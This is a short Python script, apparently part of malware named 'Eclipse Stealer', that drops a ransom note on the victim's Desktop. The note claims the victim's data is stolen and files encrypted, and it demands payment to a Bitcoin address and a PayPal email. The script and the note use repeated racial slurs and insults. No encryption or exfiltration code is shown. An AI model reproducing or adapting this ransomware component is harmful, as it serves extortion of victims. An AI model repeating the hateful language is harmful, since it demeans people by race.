import os

def note():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    nfilepath = os.path.join(desktop_path, "nigger_open_me.txt")

    note_content = """
    Unlucky nigger your info has been 

    comprimised by Eclipse Stealer and all files
    will be encrypted, as of reading this
    
    in order to get them back and to recive the Decrypter do the following

    1] If you have bitcoin send 50 BTC to the following address 
    [ bc1qf0pk2jvquxjzqugfsh7t0u3ekyu6l7488k5xa5 ]

    2] if you dont have bitcoin and your a retard then send $60 to this paypal
    [ ratclient123@gmail.com ]

    3] and if you dont have any of those because your a broke ass nigga then 
    your shit is staying encrypted the following things are being encrypted

    Desktop
    Documents
    Pictures
    Videos
    entire C drive
    """

    # Create and write to the note
    with open(nfilepath, 'w') as note_file:
        note_file.write(note_content)

    print(f"Note created on your desktop at: {nfilepath}")

if __name__ == "__main__":
    note()
